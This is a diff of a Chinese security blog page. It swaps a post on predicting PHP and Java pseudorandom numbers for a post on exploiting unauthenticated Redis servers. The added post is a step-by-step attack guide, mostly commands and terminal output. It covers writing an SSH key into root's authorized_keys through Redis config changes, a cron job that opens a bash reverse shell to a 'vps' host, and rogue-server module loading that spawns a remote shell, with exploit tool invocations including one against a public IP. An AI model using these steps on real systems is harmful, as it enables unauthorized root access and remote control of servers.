@@ -16,25 +16,20 @@
   <meta name="description" content="">
   <meta name="author" content="John Doe">
   <meta name="keywords" content="">
-  <meta name="description" content="PHP mt_scrand()&#x2F;&#x2F;播种 Mersenne Twister 随机数生成器 mt_rand()&#x2F;&#x2F;生成随机数  mt_scrand()通过 seed 分发种子，通过 mt_rand()生成伪随机数 从 PHP 4.2.0 开始，随机数生成器自动播种，因此没有必要使用该函数 因此不需要播种，并且如果设置了 seed 参数 生成的随机数就是伪随机数，意思就是每次生成的随机数 是一样的  当">
+  <meta name="description" content="https:&#x2F;&#x2F;www.cnblogs.com&#x2F;twosmi1e&#x2F;p&#x2F;13308682.html 写ssh-keygen登录先决条件：目标root账号启动redis服务，开放ssh服务，允许密钥登录  生成公私钥   ssh-keygen -t rsa   处理公钥   (echo -e “\n\n”;cat id_rsa.pub; echo -e “\n\n”) &gt; 1.txt   写入公">
 <meta property="og:type" content="article">
-<meta property="og:title" content="伪随机数">
-<meta property="og:url" content="http://example.com/2021/11/14/%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E5%88%86%E6%9E%90/index.html">
+<meta property="og:title" content="Redis未授权访问">
+<meta property="og:url" content="http://example.com/2022/03/24/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/index.html">
 <meta property="og:site_name" content="🗄">
-<meta property="og:description" content="PHP mt_scrand()&#x2F;&#x2F;播种 Mersenne Twister 随机数生成器 mt_rand()&#x2F;&#x2F;生成随机数  mt_scrand()通过 seed 分发种子，通过 mt_rand()生成伪随机数 从 PHP 4.2.0 开始，随机数生成器自动播种，因此没有必要使用该函数 因此不需要播种，并且如果设置了 seed 参数 生成的随机数就是伪随机数，意思就是每次生成的随机数 是一样的  当">
+<meta property="og:description" content="https:&#x2F;&#x2F;www.cnblogs.com&#x2F;twosmi1e&#x2F;p&#x2F;13308682.html 写ssh-keygen登录先决条件：目标root账号启动redis服务，开放ssh服务，允许密钥登录  生成公私钥   ssh-keygen -t rsa   处理公钥   (echo -e “\n\n”;cat id_rsa.pub; echo -e “\n\n”) &gt; 1.txt   写入公">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211114013004978.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211114164615749.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211114165211667.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211114202701125.png">
-<meta property="article:published_time" content="2021-11-14T13:15:21.000Z">
-<meta property="article:modified_time" content="2022-03-31T14:38:00.959Z">
+<meta property="article:published_time" content="2022-03-24T15:52:05.667Z">
+<meta property="article:modified_time" content="2022-03-31T14:21:37.974Z">
 <meta property="article:author" content="John Doe">
-<meta property="article:tag" content="ctf-training">
+<meta property="article:tag" content="knowledge">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211114013004978.png">
   
-  <title>伪随机数 - 🗄</title>
+  <title>Redis未授权访问 - 🗄</title>
 
   <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
 
@@ -196,7 +191,7 @@
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
           <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="伪随机数">
+            <span class="h2" id="subtitle" title="Redis未授权访问">
               
             </span>
 
@@ -206,8 +201,8 @@
   
     <span class="post-meta">
       <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2021-11-14 21:15" pubdate>
-        November 14, 2021 pm
+      <time datetime="2022-03-24 23:52" pubdate>
+        March 24, 2022 pm
       </time>
     </span>
   
@@ -217,7 +212,7 @@
   
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      2.8k 字
+      3.9k 字
     </span>
   
 
@@ -255,62 +250,149 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">伪随机数</h1>
+            <h1 style="display: none">Redis未授权访问</h1>
             
             <div class="markdown-body">
-              <h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><blockquote>
-<p>mt_scrand()//播种 Mersenne Twister 随机数生成器</p>
-<p>mt_rand()//生成随机数</p>
+              <p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/twosmi1e/p/13308682.html">https://www.cnblogs.com/twosmi1e/p/13308682.html</a></p>
+<h2 id="写ssh-keygen登录"><a href="#写ssh-keygen登录" class="headerlink" title="写ssh-keygen登录"></a>写ssh-keygen登录</h2><p>先决条件：目标root账号启动redis服务，开放ssh服务，允许<a target="_blank" rel="noopener" href="https://www.runoob.com/w3cnote/set-ssh-login-key.html">密钥</a>登录</p>
+<ol>
+<li>生成公私钥</li>
+</ol>
+<blockquote>
+<p>ssh-keygen -t rsa</p>
 </blockquote>
-<p>mt_scrand()通过 seed 分发种子，通过 mt_rand()生成伪随机数</p>
-<p>从 PHP 4.2.0 开始，随机数生成器自动播种，因此没有必要使用该函数 因此不需要播种，并且如果设置了 seed 参数 生成的随机数就是伪随机数，意思就是每次生成的随机数 是一样的</p>
-<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211114013004978.png" srcset="/img/loading.gif" lazyload></p>
-<p>当种子不变时，生成的随机数是不变的，这就是伪随机数的漏洞所在</p>
-<p>ctfshow25</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;r&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$r</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;r&#x27;</span>];<br>    mt_srand(hexdec(substr(md5(<span class="hljs-variable">$flag</span>), <span class="hljs-number">0</span>,<span class="hljs-number">8</span>)));<br>    <span class="hljs-variable">$rand</span> = intval(<span class="hljs-variable">$r</span>)-intval(mt_rand());<br>    <span class="hljs-keyword">if</span>((!<span class="hljs-variable">$rand</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;token&#x27;</span>]==(mt_rand()+mt_rand()))&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$rand</span>;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-keyword">echo</span> system(<span class="hljs-string">&#x27;cat /proc/version&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+<ol start="2">
+<li>处理公钥</li>
+</ol>
+<blockquote>
+<p>(echo -e “\n\n”;cat id_rsa.pub; echo -e “\n\n”) &gt; 1.txt</p>
+</blockquote>
+<ol start="3">
+<li>写入公钥到redis服务器</li>
+</ol>
+<blockquote>
+<p>cat 1.txt | redis-cli -h 192.168.254.130 -x set pub</p>
+</blockquote>
+<ol start="4">
+<li>登录</li>
+</ol>
+<blockquote>
+<p>redis-cli -h 192.168.254.130</p>
+</blockquote>
+<ol start="5">
+<li>查看redis备份路径</li>
+</ol>
+<blockquote>
+<p>config get dir</p>
+</blockquote>
+<ol start="6">
+<li>篡改路径为ssh公钥存放(/root/.ssh/)</li>
+</ol>
+<blockquote>
+<p>config set dir /root/.ssh/</p>
+</blockquote>
+<ol start="7">
+<li>设置上传公钥备份文件名字为authorized_keys：</li>
+</ol>
+<blockquote>
+<p>config set dbfilename authorized_keys</p>
+</blockquote>
+<ol start="8">
+<li>保存退出</li>
+</ol>
+<blockquote>
+<p>save</p>
+<p>exit</p>
+</blockquote>
+<p>ssh免密登录redis服务器：</p>
+<blockquote>
+<p>ssh -i id_rsa <a href="mailto:&#114;&#x6f;&#x6f;&#116;&#64;&#x31;&#x39;&#50;&#46;&#x31;&#54;&#x38;&#46;&#50;&#53;&#x34;&#x2e;&#x31;&#x33;&#48;">&#114;&#x6f;&#x6f;&#116;&#64;&#x31;&#x39;&#50;&#46;&#x31;&#54;&#x38;&#46;&#50;&#53;&#x34;&#x2e;&#x31;&#x33;&#48;</a></p>
+</blockquote>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs shell">──(root💀c)-[~]<br>└─# ssh-keygen -t rsa                          <br>Generating public/private rsa key pair.<br>Enter file in which to save the key (/root/.ssh/id_rsa): <br>Enter passphrase (empty for no passphrase): <br>Enter same passphrase again: <br>Your identification has been saved in /root/.ssh/id_rsa<br>Your public key has been saved in /root/.ssh/id_rsa.pub<br>The key fingerprint is:<br>SHA256:N0MqLY84OiIS0KYJ2zIQe7SMBSSmIJHszo3ueKWaR6A root@192.168.254.128<br>The key&#x27;s randomart image is:<br>+---[RSA 3072]----+<br>|O*               |<br>|O.o              |<br>|oO .      .      |<br>|B.*    . o       |<br>|BOo   o S +      |<br>|E+o... = . o     |<br>|.= oo . .        |<br>|=o=. .           |<br>|B*..             |<br>+----[SHA256]-----+<br>                                                                             <br>┌──(root💀192)-[~]<br>└─# cd .ssh/<br>                                                                             <br>┌──(root💀192)-[~/.ssh]<br>└─# ls<br>id_rsa  id_rsa.pub<br>                                                                             <br>┌──(root💀192)-[~/.ssh]<br>└─# (echo -e &quot;\n\n&quot;;cat id_rsa.pub; echo -e &quot;\n\n&quot;)&gt;1.txt<br>                                                                             <br>┌──(root💀192)-[~/.ssh]<br>└─# cat 1.txt | redis-cli -h 192.168.254.130 -x set file <br>OK<br>                                                                             <br>┌──(root💀192)-[~/.ssh]<br>└─# redis-cli -h 192.168.254.130<br>192.168.254.130:6379&gt; config get dir<br>1) &quot;dir&quot;<br>2) &quot;/root/redis-2.8.17/src&quot;<br>192.168.254.130:6379&gt; config set dir /root/.ssh/<br>OK<br>192.168.254.130:6379&gt; config get dbfilename<br>1) &quot;dbfilename&quot;<br>2) &quot;dump.rdb&quot;<br>192.168.254.130:6379&gt; config set dbfilename authorized_keys<br>OK<br>192.168.254.130:6379&gt; save<br>OK<br>192.168.254.130:6379&gt; exit<br>                                                                             <br>┌──(root💀192)-[~/.ssh]<br>└─# ssh -i id_rsa root@192.168.254.130 -p 22888<br>The authenticity of host &#x27;[192.168.254.130]:22888 ([192.168.254.130]:22888)&#x27; can&#x27;t be established.<br>ECDSA key fingerprint is SHA256:Zopc14FUvhzjh0dHrhIok+KREN4hXhbm2NNkyuMDXbw.<br>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes<br>Warning: Permanently added &#x27;[192.168.254.130]:22888&#x27; (ECDSA) to the list of known hosts.<br>Last login: Thu Mar 24 09:21:28 2022 from 192.168.254.128<br>[root@centos7 ~]#                   <br></code></pre></td></tr></table></figure>
 
-<p>首先我们要获得第一个随机数，根据条件，传入 r=0；使用工具对得到的第一个随机数进行逆推，<a target="_blank" rel="noopener" href="https://github.com/openwall/php_mt_seed">https://github.com/openwall/php_mt_seed</a></p>
-<p>得到<strong>两个可能</strong>的随机数种子，即值<code>hexdec(substr(md5($flag), 0,8))</code></p>
-<p>当<code>$_COOKIE[&#39;token&#39;]==(mt_rand()+mt_rand())</code>时得到 flag，由于前面已经执行了一次<code>mt_rand()</code>，我们需要得到后面两次的<code>mt_rand()</code>相加</p>
-<p>编写脚本，对两个种子进行尝试，即得到两个<code>mt\_rand()+mt\_rand()</code>进行尝试</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>mt_scand(得到的种子值);<br><span class="hljs-keyword">echo</span> mt_rand().<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">echo</span> mt_rand()+mt_rand();<br></code></pre></td></tr></table></figure>
-
-<p>r=从页面得到的第一个随机数值 Cooke:token=脚本得到的两个随机数值相加</p>
-<p>纵观整体难度不大，主要理解漏洞原理，以及题目使用的是后面两个随机值的相加</p>
-<h2 id="java"><a href="#java" class="headerlink" title="java"></a>java</h2><p>强伪随机数 RNG 实现<code>java.security.SecureRandom</code>类，该类使用临时文件夹中大小，线程休眠时间等的值作为随机数种子；而弱伪随机数实现 PRNG<code>java.util.Random</code>类，默认使用当前时间作为种子，并且采用线性同余法计算下一个随机数。</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> learn;<br><span class="hljs-keyword">import</span> java.util.Random;<br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">World</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        Random r1 = <span class="hljs-keyword">new</span> Random(<span class="hljs-number">1</span>);<br>        System.out.println(<span class="hljs-string">&quot;r1.nextINT(12)=&quot;</span> + r1.nextInt(<span class="hljs-number">12</span>));<br><br>        Random r2 = <span class="hljs-keyword">new</span> Random(<span class="hljs-number">1</span>);<br>        System.out.println(<span class="hljs-string">&quot;r2.nextINT(12)=&quot;</span> + r2.nextInt(<span class="hljs-number">12</span>));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
-
-<p>得到</p>
+<h2 id="写计划任务反弹shell"><a href="#写计划任务反弹shell" class="headerlink" title="写计划任务反弹shell"></a>写计划任务反弹shell</h2><p>ubuntu下可以利用的cron有以下几个地方：</p>
+<pre><code>/etc/crontab：该文件里面的任务计划可以直接执行
+/etc/cron.d/*：该目录下的任意文件都可以被当作任务计划去执行，并且避免了原先任务计划文件被覆盖的情况
+/var/spool/cron/crontabs/：该目录下定义的任务计划文件会被执行，不过需要有一个前提，就是该任务计划文件的权限必须为600
+</code></pre>
+<p>CentOS下计划任务文件</p>
+<pre><code>/etc/crontab：该文件里面的任务计划可以直接执行
+/var/spool/cron/root：该文件里面的任务计划可以直接执行
+</code></pre>
+<p>和写ssh-keygen方法一样</p>
 <blockquote>
-<p>r1.nextINT(12)=5<br>r2.nextINT(12)=5</p>
+<p>set x “\n* * * * * bash -i &gt;&amp; /dev/tcp/vps/port 0&gt;&amp;1\n”     //* * * * * 每一分钟执行一次</p>
+<p>config set dir /var/spool/cron</p>
+<p>config set dbfilename root</p>
+<p>save</p>
 </blockquote>
-<p>无论执行多少次，结果都不会改变，Random 生成的随机数是伪随机数，这就可以预测<code>java.util.Random</code>。调用<code>random.nextInt</code>生成三个连续的随机数，根据前两个随机数就可以预测第三个随机数。这里我们跟一下源代码<img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211114164615749.png" srcset="/img/loading.gif" lazyload></p>
-<p>调用 next 方法，如果 bound 是非正，抛出异常</p>
-<p>传参 31，<code>bound&amp;m)==0</code>判断 bound 是否为 2 的 x 次方，如果是，则 r 值取<code>(int)((bound * (long)r) &gt;&gt; 31)</code>，next(31)传了什么值？跟进 next<img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211114165211667.png" srcset="/img/loading.gif" lazyload></p>
-<p>Random.class 有三个常量</p>
+<p>Ubuntu下：</p>
+<ol>
+<li>如果写<code>/etc/crontab</code>和<code>/etc/cron.d</code>，由于存在乱码，语法不识别，会导致ubuntu不能正确识别，导致定时任务失败。</li>
+<li>如果写<code>/var/spool/cron/crontabs/root</code>，权限是644，ubuntu不能运行。</li>
+</ol>
 <blockquote>
-<p>private static final long multiplier = 0x5DEECE66DL;//进制是 25214903917</p>
-<p>private static final long addend = 0xBL;//十进制是 11</p>
-<p>private static final long mask = (1L &lt;&lt; 48) - 1;//十进制是 281474976710655，十六进制是 0xffffffffffff</p>
+<p>crontab反弹debian,ubuntu都不行，因为他们对计划任务的格式很严格，必须要执行<code>crontab -u root /var/spool/cron/crontabs/root</code>通过语法检查后，才能执行计划任务。</p>
 </blockquote>
-<p>构造方法</p>
-<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211114202701125.png" srcset="/img/loading.gif" lazyload></p>
+<p>所以当渗透系统为ubuntu/debian且是低权限时，不优先考虑写计划任务</p>
+<h2 id="写webshell"><a href="#写webshell" class="headerlink" title="写webshell"></a>写webshell</h2><p>略</p>
+<p>redis-4.0.10 之前的版本 Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。</p>
+<p>redis-4.0.10 之后的版本 默认开启了保护模式，仅允许本地无密码验证连接。如果要利用，可能就要考虑弱口令和配置错误了。</p>
+<p>实战在生产环境下用还是会有很多问题的</p>
+<ol>
+<li>redis数据量稍微大一点，写shell到文件之后，php因为文件太大是会拒绝执行的</li>
+<li>Ubuntu，Debian写计划任务反弹无用</li>
+<li>写/etc/passwd会覆盖原有/etc/passwd，不可能改了再改回来</li>
+<li>生产环境下用<code>KEY *</code> 这样的命令直接炸</li>
+</ol>
+<h2 id="主从复制getshell"><a href="#主从复制getshell" class="headerlink" title="主从复制getshell"></a>主从复制getshell</h2><p>脚本一：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/Testzero-wz/Awsome-Redis-Rogue-Server">https://github.com/Testzero-wz/Awsome-Redis-Rogue-Server</a></p>
+<p>vps：</p>
 <blockquote>
-<p>oldseed 是(0x2F^0x5DEECE66D)&amp;0xffffffffffff 的值 0x5DEECE642， nextseed 为（oldseed*0x5DEECE66D+0xB）&amp; 0xffffffffffff 的值 0xBA2442955625，seed.compareAndSet(oldseed, nextseed)判断 nextseed 是否为预期的结果， 如果是预期结果返回 0xBA2442955625 &gt;&gt;&gt; (48 - 31)为 0x5D12214A；因此 next(31)为 0x5D12214A(十进制为 1561469258)</p>
+<p>python3 redis-rogue-server.py -v -lport 80 -path exp.so</p>
 </blockquote>
-<p>就是说随机数种子 oldseed 和后一个随机数种子 nextseed 都被定义为 long 类型，返回为下一个种子右移 48-31=17 位后强制转换 int 的结果</p>
-<p>while 里的 compareAndSet 方法比较当前种子是否为 oldseed，如果是的话就</p>
-<p>更新为 nextseed，一般都会返回 true，下一个种子的更新算法在 do…while 结构里面，<code>nextseed=(oldseed * multiplier + addend) &amp; mask</code></p>
-<p>//java.util.Random <a target="_blank" rel="noopener" href="https://bbs.csdn.net/topics/390855511">https://bbs.csdn.net/topics/390855511</a></p>
-<p>//AtomicLong<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_42146366/article/details/87820373">https://blog.csdn.net/weixin_42146366/article/details/87820373</a></p>
-<ul>
-<li>预测方法</li>
-</ul>
+<p>redis-cli连接redis服务</p>
+<p>计划任务以及ssh_keygen不可写时，写/tmp</p>
 <blockquote>
-<p>如果把生成第一个随机数的种子定义为 seed1，seed2，seed3 往后顺延的话，seed1 右移 16 位就是第一个随机数的值，说明第一个随机数丢了 16 位，导致 seed1 就有 2 的 16 次方种可能。</p>
-<p>把 2 的 16 次方种可能带入计算下一个 seed2，并且右移查看是否和第二个随机数的值相等就能确定是否正确的找到了 seed1。</p>
-<p>如果前两个数是正数，但第三个数是负数，只需要对得到的补码再求一次补码即可，也就是取反后加 1。</p>
+<p>config set dir /tmp</p>
+<p>config set dbfilename exp.so</p>
 </blockquote>
+<p>设置主从关系</p>
+<blockquote>
+<p>slaveof vps 80</p>
+</blockquote>
+<p>导入模块</p>
+<blockquote>
+<p>module load exp.so</p>
+<p>module list //出现如下即成功：</p>
+<ol>
+<li><ol>
+<li>“name”</li>
+<li>“system”</li>
+<li>“ver”</li>
+<li>(integer) 1</li>
+</ol>
+</li>
+</ol>
+</blockquote>
+<p>反弹shell：</p>
+<blockquote>
+<p>nv -lnvp 2333</p>
+<p>system.rev vps 2333</p>
+</blockquote>
+<p>脚本二：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a></p>
+<p>有两个模式</p>
+<blockquote>
+<p>python3 redis-rogue-server.py –rhost 123.58.236.76 –rport 6379 –lhost vps –lport 443 -v (默认：–exp=exp.so)</p>
+</blockquote>
+<p>i进入交互，r反弹shell</p>
+<p>脚本三：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/Ridter/redis-rce">https://github.com/Ridter/redis-rce</a></p>
+<blockquote>
+<p>python3 redis-rce.py -r 172.20.0.1 -L 127.0.0.1 -P 80 -f module.so</p>
+</blockquote>
+<p>同上</p>
 
             </div>
             <hr>
@@ -328,7 +410,7 @@
                   <div class="post-meta">
                     <i class="iconfont icon-tags"></i>
                     
-                      <a class="hover-with-bg" href="/tags/ctf-training/">ctf-training</a>
+                      <a class="hover-with-bg" href="/tags/knowledge/">knowledge</a>
                     
                   </div>
                 
@@ -345,18 +427,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2021/12/04/XXE/">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">XXE</span>
-                        <span class="visible-mobile">Previous</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2021/10/05/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">
-                        <span class="hidden-mobile">文件包含</span>
+                      <a href="/2022/01/03/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">
+                        <span class="hidden-mobile">内网信息收集</span>
                         <span class="visible-mobile">Next</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
